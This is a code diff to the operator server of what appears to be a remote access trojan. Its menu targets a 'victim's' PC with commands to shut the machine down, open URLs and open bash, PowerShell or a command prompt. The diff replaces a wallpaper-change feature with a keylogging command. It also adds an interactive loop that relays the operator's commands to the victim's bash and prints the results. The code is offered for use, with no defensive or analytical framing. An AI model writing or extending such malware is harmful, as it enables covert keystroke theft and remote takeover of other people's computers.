@@ -23,7 +23,7 @@ class Server():
         3.) GET VICTIM'S WINDOWS USERNAME
         4.) SHUTDOWN VICTIM'S PC
         5.) OPEN URL IN VICTIM'S BROWSER
-        6.) CHANGE VICTIM'S WALLPAPER
+        6.) START LOGGING VICTIM'S KEYBOARD IN A TEXT FILE
         7.) OPEN VICTIM'S BASH
         8.) OPEN VICTIM'S POWERSHELL
         9.) OPEN VICTIM'S COMMAND PROMPT
@@ -68,16 +68,20 @@ class Server():
                         raise NotAValidURLException("The URL You Entered Was Invalid")
                     else:
                         raise NotAValidURLException("URL Must Start With http:// or https://")
-            # Change Wallpaper
+            # Log Keys
             elif choice==6:
-                _wallpaper_path=input("Enter Wallpaper Path : ")
-                if os.path.exists(_wallpaper_path):
-                    img=cv2.imread(_wallpaper_path)
-                    self.c.send(f"change_wallpaper={img}".encode())
-                else:
-                    raise InvalidWallpaperPathException("The Wallpaper Path You Entered Was Invalid")
-            elif choice==7:...
+                self.c.send("log_keys".encode())
+                print(self.c.recv(99999))
+            # Open Bash
+            elif choice==7:
+                self.c.send("open_bash".encode())
+                while True:
+                    _bash_cmd=input("Victim's Bash >>>")
+                    self.c.send(_bash_cmd.encode())
+                    print(self.c.recv(99999).decode())
+            # Open Powershell
             elif choice==8:...
+            # Open Command Prompt
             elif choice==9:...
     @staticmethod
     def init_socket(_addr:str,_port:int) -> Tuple[socket.socket,Tuple[str,int]]:
